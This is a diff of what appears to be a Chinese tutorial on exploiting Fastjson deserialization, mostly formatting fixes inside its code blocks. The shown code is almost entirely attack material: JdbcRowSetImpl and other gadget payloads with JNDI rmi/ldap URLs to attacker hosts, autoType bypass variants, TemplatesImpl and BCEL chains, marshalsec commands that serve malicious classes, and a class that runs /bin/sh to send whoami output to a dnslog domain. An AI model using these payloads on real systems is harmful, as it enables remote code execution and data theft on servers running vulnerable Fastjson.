@@ -97,7 +97,7 @@ FastJson自己实现了一套反序列化的机制，并没有使用默认的rea
 
 
 ```java
-_class Apple implements Fruit {
+class Apple implements Fruit {
     private BigDecimal price;
     //省略 setter/getter、toString等
 }
@@ -105,8 +105,7 @@ _class Apple implements Fruit {
 class Banana implements Fruit {
     private BigDecimal price;
     //省略 setter/getter、toString等
-}_
-
+}
 
 ```
 
@@ -116,7 +115,6 @@ class Banana implements Fruit {
 ```java
 toJSONString : {"fruit":{"price":0.5}}
 toJSONString : {"fruit":{"price":500}}
-
 ```
 
 
@@ -130,7 +128,6 @@ toJSONString : {"fruit":{"price":500}}
         "price":0.5
     }
 }
-
 ```
 
 
@@ -147,12 +144,11 @@ fastjson在解析json的过程中，支持使用`autoType`来实例化某一个�
 
 
 ```java
-_{
+{
     "@type":"com.sun.rowset.JdbcRowSetImpl",
     "dataSourceName":"rmi://Cip:9999/evilclass",
     "autoCommit": true
-}_
-
+}
 ```
 
 
@@ -172,8 +168,7 @@ _{
 
 
 ```java
-_{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://Cip:9999/Exploit","autoCommit":true}_ 
-
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://Cip:9999/Exploit","autoCommit":true} 
 ```
 
 
@@ -190,8 +185,7 @@ _{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://Cip:9999/Explo
 
 
 ```java
-_{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://Cip:9999/Exploit","autoCommit":true}_ 
-
+{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://Cip:9999/Exploit","autoCommit":true} 
 ```
 
 
@@ -208,8 +202,7 @@ _{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://Cip:9999/Exp
 
 
 ```java
-_{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://Cip:9999/Exploit", "autoCommit":true}_
-
+{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://Cip:9999/Exploit", "autoCommit":true}
 ```
 
 
@@ -226,8 +219,7 @@ _{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://Cip:9999/
 
 
 ```java
-_{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://Cip:9999/Exploit", "autoCommit":true}_
-
+{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://Cip:9999/Exploit", "autoCommit":true}
 ```
 
 
@@ -241,8 +233,7 @@ _{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://Cip:9999/E
 
 
 ```java
-{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://C_ip:9999/Exploit"}}
-
+{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"datasource":"ldap://Cip:9999/Exploit"}}
 ```
 
 
@@ -262,7 +253,7 @@ autoTypeSupport属性为false才能使用
 
 
 ```java
-_{
+{
     "a": {
         "@type": "java.lang.Class", 
         "val": "com.sun.rowset.JdbcRowSetImpl"
@@ -272,8 +263,7 @@ _{
         "dataSourceName": "rmi://Cip:9999/jndi", 
         "autoCommit": true
     }
-}_
-
+}
 ```
 
 
@@ -287,8 +277,7 @@ _{
 
 
 ```java
-_{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://Cip:9999/exploit"}";_
-
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://Cip:9999/exploit"}";
 ```
 
 
@@ -303,7 +292,6 @@ _{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://Cip:99
 {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
 {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
 {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}
-
 ```
 
 
@@ -338,7 +326,7 @@ public class dnslog{
     static {
         try {
             Runtime rt = Runtime.getRuntime();
-            String[] commands = {"/bin/sh", "-c", "ping user.`whoami`.n9xpa1.dnslog.cn";
+            String[] commands = {"/bin/sh", "-c", "ping user.whoami.n9xpa1.dnslog.cn";
             Process pc = rt.exec(commands);
             pc.waitFor();
         } catch (Exception e) {
@@ -346,7 +334,6 @@ public class dnslog{
         }
     }
 }
-
 ```
 
 
@@ -358,7 +345,6 @@ public class dnslog{
 
 ```java
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.50.123:8000/#dnslog" 9999
-
 ```
 
 
@@ -406,13 +392,11 @@ public class Shell{
     public static void main(String[] args) throws Exception {
     }
 }
-
 ```
 
 
 ```shell
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.50.123:8000/#Shell" 9999
-
 ```
 
 
@@ -436,7 +420,6 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 ```java
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.50.123:8000/#Shell" 9999
-
 ```
 
 
@@ -451,7 +434,6 @@ payload如下
         "autoCommit":true
     }
 }
-
 ```
 
 
@@ -472,7 +454,6 @@ payload如下
 
 ```shell
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.50.123:8000/#evilclass" 9999
-
 ```
 
 
@@ -492,7 +473,6 @@ public class evilclass{
     evilclass c = new evilclass();
     }
 }
-
 ```
 
 
@@ -501,7 +481,6 @@ POC
 
 ```java
 {"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://192.168.50.177:9999/evilclass","autoCommit":true}}}
-
 ```
 
 
@@ -542,7 +521,6 @@ POC
 
 ```java
 JSONObject.parseObject(sb.toString(), new Feature[]{Feature.SupportNonPublicField});
-
 ```
 
 
@@ -574,7 +552,6 @@ public class Calc extends AbstractTranslet {
         Calc t = new Calc();    
     }
 }
-
 ```
 
 
@@ -589,7 +566,6 @@ s = base64.encodestring(fin.read()).replace("\n", "")
 fout.write(s)
 fin.close()
 fout.close()
-
 ```
 
 
@@ -597,7 +573,7 @@ fout.close()
 
 
 ```java
-_{    
+{    
 "a": {        
 "@type": "java.lang.Class",        
 "val": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"        
@@ -612,8 +588,7 @@ _{
 "version": "1.0",        
 "allowedProtocols": "all"      
 }
-}_
-
+}
 ```
 
 
@@ -645,7 +620,7 @@ _{
 
 
 ```java
-_import java.io.IOException;
+import java.io.IOException;
 
 public class poc1 {
     static {
@@ -655,15 +630,14 @@ public class poc1 {
             e.printStackTrace();
         }
     }
-}_
-
+}
 ```
 
 
 编码poc_1类
 
 
-```text
+```java
 import com.sun.org.apache.bcel.internal.classfile.Utility;
 import java.io.BufferedWriter;
 import java.io.FileWriter;
@@ -684,7 +658,6 @@ public class TestBCEL{
         bw.close();
     }
 }
-
 ```
 
 
